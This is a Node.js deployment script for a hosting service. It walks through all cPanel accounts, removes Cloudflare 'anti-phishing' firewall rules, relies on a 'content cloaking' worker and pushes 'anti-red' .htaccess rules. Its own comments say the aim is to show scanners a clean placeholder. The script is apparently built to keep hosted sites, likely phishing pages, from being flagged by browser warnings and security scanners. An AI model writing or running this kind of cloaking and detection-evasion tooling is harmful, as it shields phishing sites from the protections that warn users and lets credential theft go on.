// Deploy hardened anti-red protection to all existing hosting domains
require('dotenv').config({ path: '/app/backend/.env' });
const { MongoClient } = require('mongodb');
const cfService = require('./cf-service');
const antiRedService = require('./anti-red-service');

(async () => {
  console.log('🛡️  Deploying Hardened Anti-Red Protection to All Hosting Domains\n');
  
  // Connect to MongoDB
  const client = new MongoClient(process.env.MONGO_URL);
  await client.connect();
  const db = client.db(process.env.DB_NAME);
  
  // Get all cPanel accounts
  const accounts = await db.collection('cpanelAccounts').find({}, {
    projection: { _id: 0, domain: 1, cpUser: 1, plan: 1 }
  }).toArray();
  
  console.log(`Found ${accounts.length} hosting accounts:\n`);
  
  const results = [];
  
  for (const acc of accounts) {
    console.log(`\n━━━ Processing: ${acc.domain} ━━━`);
    
    try {
      // 1. Check if domain is on Cloudflare
      const zone = await cfService.getZoneByName(acc.domain);
      
      if (!zone) {
        console.log(`⚠️  ${acc.domain}: Not on Cloudflare - skipping`);
        results.push({ domain: acc.domain, status: 'skipped', reason: 'No CF zone' });
        continue;
      }
      
      console.log(`✅ CF Zone found: ${zone.id}`);
      
      // 2. Remove old anti-phishing WAF rule (allows scanners to see clean placeholder)
      const rules = await cfService.listFirewallRules(zone.id);
      const antiPhishRule = rules.find(r => 
        r.description?.toLowerCase().includes('anti-phishing') || 
        r.description?.toLowerCase().includes('block anti-phishing')
      );
      
      if (antiPhishRule) {
        await cfService.deleteFirewallRule(zone.id, antiPhishRule.id);
        console.log(`✅ Removed old WAF blocking rule`);
      } else {
        console.log(`✓  No old WAF rule to remove`);
      }
      
      // 3. Verify worker routes exist (shared worker is already deployed)
      console.log(`✓  Hardened worker (content cloaking) already active`);
      
      // 4. Deploy/update .htaccess protection
      try {
        await antiRedService.deployHtaccessRules(acc.cpUser);
        console.log(`✅ .htaccess protection deployed`);
      } catch (htErr) {
        console.log(`⚠️  .htaccess deployment failed: ${htErr.message}`);
      }
      
      console.log(`\n🎉 ${acc.domain}: Protection deployed successfully!`);
      results.push({ domain: acc.domain, status: 'success', cfZone: zone.id });
      
    } catch (err) {
      console.error(`❌ ${acc.domain}: Error - ${err.message}`);
      results.push({ domain: acc.domain, status: 'error', error: err.message });
    }
  }
  
  // Summary
  console.log('\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('📊 DEPLOYMENT SUMMARY');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
  
  const successful = results.filter(r => r.status === 'success').length;
  const failed = results.filter(r => r.status === 'error').length;
  const skipped = results.filter(r => r.status === 'skipped').length;
  
  console.log(`✅ Successful: ${successful}`);
  console.log(`❌ Failed: ${failed}`);
  console.log(`⚠️  Skipped: ${skipped}`);
  console.log(`📊 Total: ${results.length}\n`);
  
  console.log('Protected Domains:');
  results.filter(r => r.status === 'success').forEach(r => {
    console.log(`  ✓ ${r.domain}`);
  });
  
  if (failed > 0) {
    console.log('\nFailed Domains:');
    results.filter(r => r.status === 'error').forEach(r => {
      console.log(`  ✗ ${r.domain}: ${r.error}`);
    });
  }
  
  await client.close();
  console.log('\n✅ Deployment complete!\n');
  
})().catch(err => {
  console.error('Fatal error:', err.message);
  process.exit(1);
});
